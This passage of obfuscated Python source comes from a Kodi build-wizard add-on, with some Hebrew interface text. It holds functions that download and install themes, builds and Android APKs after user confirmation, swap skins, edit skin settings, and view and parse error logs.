						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4551
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4552
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4553
		else :O0OO0O000OOOOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO000O0000OOOOO ,wiz .checkBuild (OOOO000O0000OOOOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4554
		if O0OO0O000OOOOOO0O :#line:4555
			OO00OO00OO0000OOO =wiz .checkTheme (OOOO000O0000OOOOO ,theme ,'url')#line:4556
			O000OOOO0O0O0OO00 =OOOO000O0000OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4557
			if not wiz .workingURL (OO00OO00OO0000OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4558
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4559
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4560
			O0O0O00O0O0O00OOO =os .path .join (PACKAGES ,'%s.zip'%O000OOOO0O0O0OO00 )#line:4561
			try :os .remove (O0O0O00O0O0O00OOO )#line:4562
			except :pass #line:4563
			downloader .download (OO00OO00OO0000OOO ,O0O0O00O0O0O00OOO ,DP )#line:4564
			xbmc .sleep (1000 )#line:4565
			DP .update (0 ,"","Installing %s "%OOOO000O0000OOOOO )#line:4566
			OOOOOOOOOO00O0O00 =False #line:4567
			if url not in ["fresh","normal"]:#line:4568
				OOOOOOOOOO00O0O00 =testTheme (O0O0O00O0O0O00OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4569
				O0OO000O00O000OO0 =testGui (O0O0O00O0O0O00OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4570
				if OOOOOOOOOO00O0O00 ==True :#line:4571
					wiz .lookandFeelData ('save')#line:4572
					O0O00O0O0O000O000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4573
					OOO0O0OOOO0000OOO =xbmc .getSkinDir ()#line:4574
					skinSwitch .swapSkins (O0O00O0O0O000O000 )#line:4576
					O0000OOOOO0O00000 =0 #line:4577
					xbmc .sleep (1000 )#line:4578
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000OOOOO0O00000 <150 :#line:4579
						O0000OOOOO0O00000 +=1 #line:4580
						xbmc .sleep (1000 )#line:4581
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4582
						wiz .ebi ('SendClick(11)')#line:4583
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4584
					xbmc .sleep (1000 )#line:4585
			O0000O00O0OO000OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4586
			DP .update (0 ,O0000O00O0OO000OO ,'','אנא המתן')#line:4587
			OOOO0OOOO0O0O0OOO ,O00000OOO000000O0 ,OO0OO0000OO0O00O0 =extract .all (O0O0O00O0O0O00OOO ,HOME ,DP ,title =O0000O00O0OO000OO )#line:4588
			wiz .setS ('buildtheme',theme )#line:4589
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOO0OOOO0O0O0OOO ,O00000OOO000000O0 ))#line:4590
			DP .close ()#line:4591
			if url not in ["fresh","normal"]:#line:4592
				wiz .forceUpdate ()#line:4593
				if KODIV >=17 :wiz .kodi17Fix ()#line:4594
				if O0OO000O00O000OO0 ==True :#line:4595
					wiz .lookandFeelData ('save')#line:4596
					wiz .defaultSkin ()#line:4597
					OOO0O0OOOO0000OOO =wiz .getS ('defaultskin')#line:4598
					skinSwitch .swapSkins (OOO0O0OOOO0000OOO )#line:4599
					O0000OOOOO0O00000 =0 #line:4600
					xbmc .sleep (1000 )#line:4601
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000OOOOO0O00000 <150 :#line:4602
						O0000OOOOO0O00000 +=1 #line:4603
						xbmc .sleep (1000 )#line:4604
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4606
						wiz .ebi ('SendClick(11)')#line:4607
					wiz .lookandFeelData ('restore')#line:4608
				elif OOOOOOOOOO00O0O00 ==True :#line:4609
					skinSwitch .swapSkins (OOO0O0OOOO0000OOO )#line:4610
					O0000OOOOO0O00000 =0 #line:4611
					xbmc .sleep (1000 )#line:4612
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000OOOOO0O00000 <150 :#line:4613
						O0000OOOOO0O00000 +=1 #line:4614
						xbmc .sleep (1000 )#line:4615
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4617
						wiz .ebi ('SendClick(11)')#line:4618
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4619
					wiz .lookandFeelData ('restore')#line:4620
				else :#line:4621
					wiz .ebi ("ReloadSkin()")#line:4622
					xbmc .sleep (1000 )#line:4623
					wiz .ebi ("Container.Refresh")#line:4624
		else :#line:4625
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4626
def skin_homeselect ():#line:4630
	try :#line:4632
		OO00OOO0O0OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4633
		O00OO000O00OOOOOO =open (OO00OOO0O0OO000O0 ,'r')#line:4635
		O00OO0O0O0000OO00 =O00OO000O00OOOOOO .read ()#line:4636
		O00OO000O00OOOOOO .close ()#line:4637
		OO0OOOOO0OO000OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4638
		O00OO0O0OOOOOOO00 =re .compile (OO0OOOOO0OO000OOO ).findall (O00OO0O0O0000OO00 )[0 ]#line:4639
		O00OO000O00OOOOOO =open (OO00OOO0O0OO000O0 ,'w')#line:4640
		O00OO000O00OOOOOO .write (O00OO0O0O0000OO00 .replace ('<setting id="HomeS" type="string%s/setting>'%O00OO0O0OOOOOOO00 ,'<setting id="HomeS" type="string"></setting>'))#line:4641
		O00OO000O00OOOOOO .close ()#line:4642
	except :#line:4643
		pass #line:4644
def skin_lower ():#line:4647
	OOOO000O00OOOOO0O =(ADDON .getSetting ("lower"))#line:4648
	if OOOO000O00OOOOO0O =='true':#line:4649
		try :#line:4652
			OOOO00O0O00OO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4653
			O0000OO0O00OOOO00 =open (OOOO00O0O00OO00O0 ,'r')#line:4655
			OOO0O0OO0000000O0 =O0000OO0O00OOOO00 .read ()#line:4656
			O0000OO0O00OOOO00 .close ()#line:4657
			OOO0OO0O0O00O0OOO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4658
			O00O00OO0OO00O00O =re .compile (OOO0OO0O0O00O0OOO ).findall (OOO0O0OO0000000O0 )[0 ]#line:4659
			O0000OO0O00OOOO00 =open (OOOO00O0O00OO00O0 ,'w')#line:4660
			O0000OO0O00OOOO00 .write (OOO0O0OO0000000O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O00O00OO0OO00O00O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4661
			O0000OO0O00OOOO00 .close ()#line:4662
		except :#line:4728
			pass #line:4729
def thirdPartyInstall (O0OO0O00000OOO00O ,OO0O0000OO0OO0OOO ):#line:4731
	if not wiz .workingURL (OO0O0000OO0OO0OOO ):#line:4732
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4733
	OO0O00O0OO000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0O00000OOO00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4734
	if OO0O00O0OO000000O ==1 :#line:4735
		freshStart ('third',True )#line:4736
	wiz .clearS ('build')#line:4737
	OO0000O0O0O0O0O0O =O0OO0O00000OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4738
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4739
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00000OOO00O ),'','אנא המתן')#line:4740
	O0O0O0OO000O00OOO =os .path .join (PACKAGES ,'%s.zip'%OO0000O0O0O0O0O0O )#line:4741
	try :os .remove (O0O0O0OO000O00OOO )#line:4742
	except :pass #line:4743
	downloader .download (OO0O0000OO0OO0OOO ,O0O0O0OO000O00OOO ,DP )#line:4744
	xbmc .sleep (1000 )#line:4745
	O0OO000000000O0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00000OOO00O )#line:4746
	DP .update (0 ,O0OO000000000O0O0 ,'','אנא המתן')#line:4747
	OOOO0O0OO0000O000 ,O0O0000O0OOOOOO0O ,OO0O0OO00O0O0O0OO =extract .all (O0O0O0OO000O00OOO ,HOME ,DP ,title =O0OO000000000O0O0 )#line:4748
	if int (float (OOOO0O0OO0000O000 ))>0 :#line:4749
		wiz .fixmetas ()#line:4750
		wiz .lookandFeelData ('save')#line:4751
		wiz .defaultSkin ()#line:4752
		wiz .setS ('installed','true')#line:4754
		wiz .setS ('extract',str (OOOO0O0OO0000O000 ))#line:4755
		wiz .setS ('errors',str (O0O0000O0OOOOOO0O ))#line:4756
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO0O0OO0000O000 ,O0O0000O0OOOOOO0O ))#line:4757
		try :os .remove (O0O0O0OO000O00OOO )#line:4758
		except :pass #line:4759
		if int (float (O0O0000O0OOOOOO0O ))>0 :#line:4760
			O00OO00O0OO0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00000OOO00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO0O0OO0000O000 ,'%',COLOR1 ,O0O0000O0OOOOOO0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4761
			if O00OO00O0OO0OO000 :#line:4762
				if isinstance (O0O0000O0OOOOOO0O ,unicode ):#line:4763
					OO0O0OO00O0O0O0OO =OO0O0OO00O0O0O0OO .encode ('utf-8')#line:4764
				wiz .TextBox (ADDONTITLE ,OO0O0OO00O0O0O0OO )#line:4765
	DP .close ()#line:4766
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4767
	if INSTALLMETHOD ==1 :OO0O0OO0OO000O0O0 =1 #line:4768
	elif INSTALLMETHOD ==2 :OO0O0OO0OO000O0O0 =0 #line:4769
	else :OO0O0OO0OO000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4770
	if OO0O0OO0OO000O0O0 ==1 :wiz .reloadFix ()#line:4771
	else :wiz .killxbmc (True )#line:4772
def testTheme (O0O0OOO00O0OO00O0 ):#line:4774
	OOOOO0OO00OOOOO00 =zipfile .ZipFile (O0O0OOO00O0OO00O0 )#line:4775
	for O0O00O00O0OOOOOOO in OOOOO0OO00OOOOO00 .infolist ():#line:4776
		if '/settings.xml'in O0O00O00O0OOOOOOO .filename :#line:4777
			return True #line:4778
	return False #line:4779
def testGui (OO000O0O0000OO00O ):#line:4781
	O000OO0O0O0O0OO0O =zipfile .ZipFile (OO000O0O0000OO00O )#line:4782
	for O0O000O0OO00O0O00 in O000OO0O0O0O0OO0O .infolist ():#line:4783
		if '/guisettings.xml'in O0O000O0OO00O0O00 .filename :#line:4784
			return True #line:4785
	return False #line:4786
def apkInstaller (OO00OOO000OO00O00 ,O0O0OOO0O0000OO0O ):#line:4788
	wiz .log (OO00OOO000OO00O00 )#line:4789
	wiz .log (O0O0OOO0O0000OO0O )#line:4790
	if wiz .platform ()=='android':#line:4791
		O000OOO000O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOO000OO00O00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4792
		if not O000OOO000O0OO00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4793
		OO0OO0O0OO0O0O00O =OO00OOO000OO00O00 #line:4794
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4795
		if not wiz .workingURL (O0O0OOO0O0000OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4796
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0OO0O0O00O ),'','אנא המתן')#line:4797
		OOO00OOOO0OOOO00O =os .path .join (PACKAGES ,"%s.apk"%OO00OOO000OO00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4798
		try :os .remove (OOO00OOOO0OOOO00O )#line:4799
		except :pass #line:4800
		downloader .download (O0O0OOO0O0000OO0O ,OOO00OOOO0OOOO00O ,DP )#line:4801
		xbmc .sleep (100 )#line:4802
		DP .close ()#line:4803
		notify .apkInstaller (OO00OOO000OO00O00 )#line:4804
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO00OOOO0OOOO00O +'")')#line:4805
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4806
def createMenu (OOOOOO00O00OOOO0O ,OO0000OOOOOOO0O0O ,OO0OO0OO0OO0O0000 ):#line:4812
	if OOOOOO00O00OOOO0O =='saveaddon':#line:4813
		OOOO000000OOO0OOO =[]#line:4814
		OOO0OOO0O00OOOOO0 =urllib .quote_plus (OO0000OOOOOOO0O0O .lower ().replace (' ',''))#line:4815
		O0O0O0000O00O0000 =OO0000OOOOOOO0O0O .replace ('Debrid','Real Debrid')#line:4816
		O00O0OOOO000OOO00 =urllib .quote_plus (OO0OO0OO0OO0O0000 .lower ().replace (' ',''))#line:4817
		OO0OO0OO0OO0O0000 =OO0OO0OO0OO0O0000 .replace ('url','URL Resolver')#line:4818
		OOOO000000OOO0OOO .append ((THEME2 %OO0OO0OO0OO0O0000 .title (),' '))#line:4819
		OOOO000000OOO0OOO .append ((THEME3 %'Save %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4820
		OOOO000000OOO0OOO .append ((THEME3 %'Restore %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4821
		OOOO000000OOO0OOO .append ((THEME3 %'Clear %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4822
	elif OOOOOO00O00OOOO0O =='save':#line:4823
		OOOO000000OOO0OOO =[]#line:4824
		OOO0OOO0O00OOOOO0 =urllib .quote_plus (OO0000OOOOOOO0O0O .lower ().replace (' ',''))#line:4825
		O0O0O0000O00O0000 =OO0000OOOOOOO0O0O .replace ('Debrid','Real Debrid')#line:4826
		O00O0OOOO000OOO00 =urllib .quote_plus (OO0OO0OO0OO0O0000 .lower ().replace (' ',''))#line:4827
		OO0OO0OO0OO0O0000 =OO0OO0OO0OO0O0000 .replace ('url','URL Resolver')#line:4828
		OOOO000000OOO0OOO .append ((THEME2 %OO0OO0OO0OO0O0000 .title (),' '))#line:4829
		OOOO000000OOO0OOO .append ((THEME3 %'Register %s'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4830
		OOOO000000OOO0OOO .append ((THEME3 %'Save %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4831
		OOOO000000OOO0OOO .append ((THEME3 %'Restore %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4832
		OOOO000000OOO0OOO .append ((THEME3 %'Import %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4833
		OOOO000000OOO0OOO .append ((THEME3 %'Clear Addon %s Data'%O0O0O0000O00O0000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO0OOO0O00OOOOO0 ,O00O0OOOO000OOO00 )))#line:4834
	elif OOOOOO00O00OOOO0O =='install':#line:4835
		OOOO000000OOO0OOO =[]#line:4836
		O00O0OOOO000OOO00 =urllib .quote_plus (OO0OO0OO0OO0O0000 )#line:4837
		OOOO000000OOO0OOO .append ((THEME2 %OO0OO0OO0OO0O0000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00O0OOOO000OOO00 )))#line:4838
		OOOO000000OOO0OOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00O0OOOO000OOO00 )))#line:4839
		OOOO000000OOO0OOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00O0OOOO000OOO00 )))#line:4840
		OOOO000000OOO0OOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00O0OOOO000OOO00 )))#line:4841
		OOOO000000OOO0OOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00O0OOOO000OOO00 )))#line:4842
	OOOO000000OOO0OOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4843
	return OOOO000000OOO0OOO #line:4844
def toggleCache (OO0OOOO0O0000O00O ):#line:4846
	OO00O0O0OO00OOO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4847
	OO0O00O00O00OO0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4848
	if OO0OOOO0O0000O00O in ['true','false']:#line:4849
		for OO0O00OO0OOO0OO0O in OO00O0O0OO00OOO0O :#line:4850
			wiz .setS (OO0O00OO0OOO0OO0O ,OO0OOOO0O0000O00O )#line:4851
	else :#line:4852
		if not OO0OOOO0O0000O00O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4853
			try :#line:4854
				OO0O00OO0OOO0OO0O =OO0O00O00O00OO0OO [OO00O0O0OO00OOO0O .index (OO0OOOO0O0000O00O )]#line:4855
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0O00OO0OOO0OO0O ))#line:4856
			except :#line:4857
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0OOOO0O0000O00O ))#line:4858
		else :#line:4859
			O00O00O0O0OO00O00 ='true'if wiz .getS (OO0OOOO0O0000O00O )=='false'else 'false'#line:4860
			wiz .setS (OO0OOOO0O0000O00O ,O00O00O0O0OO00O00 )#line:4861
def playVideo (O0OOOOO0000000OO0 ):#line:4863
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0OOOOO0000000OO0 )#line:4864
	if 'watch?v='in O0OOOOO0000000OO0 :#line:4865
		OO00O0O0OOO0O00OO ,OOO0OO0O00O0000OO =O0OOOOO0000000OO0 .split ('?')#line:4866
		OO0O00O000000O0OO =OOO0OO0O00O0000OO .split ('&')#line:4867
		for O0000O0OOOO0O0O00 in OO0O00O000000O0OO :#line:4868
			if O0000O0OOOO0O0O00 .startswith ('v='):#line:4869
				O0OOOOO0000000OO0 =O0000O0OOOO0O0O00 [2 :]#line:4870
				break #line:4871
			else :continue #line:4872
	elif 'embed'in O0OOOOO0000000OO0 or 'youtu.be'in O0OOOOO0000000OO0 :#line:4873
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0OOOOO0000000OO0 )#line:4874
		OO00O0O0OOO0O00OO =O0OOOOO0000000OO0 .split ('/')#line:4875
		if len (OO00O0O0OOO0O00OO [-1 ])>5 :#line:4876
			O0OOOOO0000000OO0 =OO00O0O0OOO0O00OO [-1 ]#line:4877
		elif len (OO00O0O0OOO0O00OO [-2 ])>5 :#line:4878
			O0OOOOO0000000OO0 =OO00O0O0OOO0O00OO [-2 ]#line:4879
	wiz .log ("YouTube URL: %s"%O0OOOOO0000000OO0 )#line:4880
	yt .PlayVideo (O0OOOOO0000000OO0 )#line:4881
def viewLogFile ():#line:4883
	O0O0O00O0OO00OOO0 =wiz .Grab_Log (True )#line:4884
	OOO0000O00OOO0O0O =wiz .Grab_Log (True ,True )#line:4885
	O0O00OOO0OO00000O =0 ;O0OO00000O0OO000O =O0O0O00O0OO00OOO0 #line:4886
	if not OOO0000O00OOO0O0O ==False and not O0O0O00O0OO00OOO0 ==False :#line:4887
		O0O00OOO0OO00000O =DIALOG .select (ADDONTITLE ,["View %s"%O0O0O00O0OO00OOO0 .replace (LOG ,""),"View %s"%OOO0000O00OOO0O0O .replace (LOG ,"")])#line:4888
		if O0O00OOO0OO00000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4889
	elif O0O0O00O0OO00OOO0 ==False and OOO0000O00OOO0O0O ==False :#line:4890
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4891
		return #line:4892
	elif not O0O0O00O0OO00OOO0 ==False :O0O00OOO0OO00000O =0 #line:4893
	elif not OOO0000O00OOO0O0O ==False :O0O00OOO0OO00000O =1 #line:4894
	O0OO00000O0OO000O =O0O0O00O0OO00OOO0 if O0O00OOO0OO00000O ==0 else OOO0000O00OOO0O0O #line:4896
	OO00OOOO0OO0OOOO0 =wiz .Grab_Log (False )if O0O00OOO0OO00000O ==0 else wiz .Grab_Log (False ,True )#line:4897
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0OO00000O0OO000O ),OO00OOOO0OO0OOOO0 )#line:4899
def errorChecking (log =None ,count =None ,all =None ):#line:4901
	if log ==None :#line:4902
		O00000OOO00OO0O00 =wiz .Grab_Log (True )#line:4903
		OO00O00000O0O0O0O =wiz .Grab_Log (True ,True )#line:4904
		if not OO00O00000O0O0O0O ==False and not O00000OOO00OO0O00 ==False :#line:4905
			O00OO00000OOO0O00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00000OOO00OO0O00 .replace (LOG ,""),errorChecking (O00000OOO00OO0O00 ,True ,True )),"View %s: %s error(s)"%(OO00O00000O0O0O0O .replace (LOG ,""),errorChecking (OO00O00000O0O0O0O ,True ,True ))])#line:4906
			if O00OO00000OOO0O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4907
		elif O00000OOO00OO0O00 ==False and OO00O00000O0O0O0O ==False :#line:4908
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4909
			return #line:4910
		elif not O00000OOO00OO0O00 ==False :O00OO00000OOO0O00 =0 #line:4911
		elif not OO00O00000O0O0O0O ==False :O00OO00000OOO0O00 =1 #line:4912
		log =O00000OOO00OO0O00 if O00OO00000OOO0O00 ==0 else OO00O00000O0O0O0O #line:4913
	if log ==False :#line:4914
		if count ==None :#line:4915
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4916
			return False #line:4917
		else :#line:4918
			return 0 #line:4919
	else :#line:4920
		if os .path .exists (log ):#line:4921
			O00OOO0O000OOO00O =open (log ,mode ='r');OOOOOOO00O000OOOO =O00OOO0O000OOO00O .read ().replace ('\n','').replace ('\r','');O00OOO0O000OOO00O .close ()#line:4922
			OOO0OOOO0O0O0OOOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOOOOOO00O000OOOO )#line:4923
			if not count ==None :#line:4924
				if all ==None :#line:4925
					OOOOOOOOOOOOOO000 =0 #line:4926
					for OO0O000OOO00OOO00 in OOO0OOOO0O0O0OOOO :#line:4927
						if ADDON_ID in OO0O000OOO00OOO00 :OOOOOOOOOOOOOO000 +=1 #line:4928
					return OOOOOOOOOOOOOO000 #line:4929
				else :return len (OOO0OOOO0O0O0OOOO )#line:4930
			if len (OOO0OOOO0O0O0OOOO )>0 :#line:4931
				OOOOOOOOOOOOOO000 =0 ;OO00OOOO0000O0OOO =""#line:4932
				for OO0O000OOO00OOO00 in OOO0OOOO0O0O0OOOO :#line:4933
					if all ==None and not ADDON_ID in OO0O000OOO00OOO00 :continue #line:4934
					else :#line:4935
						OOOOOOOOOOOOOO000 +=1 #line:4936
						OO00OOOO0000O0OOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOOOOOOOOOOOO000 ,OO0O000OOO00OOO00 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4937
				if OOOOOOOOOOOOOO000 >0 :#line:4938
					wiz .TextBox (ADDONTITLE ,OO00OOOO0000O0OOO )#line:4939
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4940
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4941
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4942
ACTION_PREVIOUS_MENU =10 #line:4944
ACTION_NAV_BACK =92 #line:4945
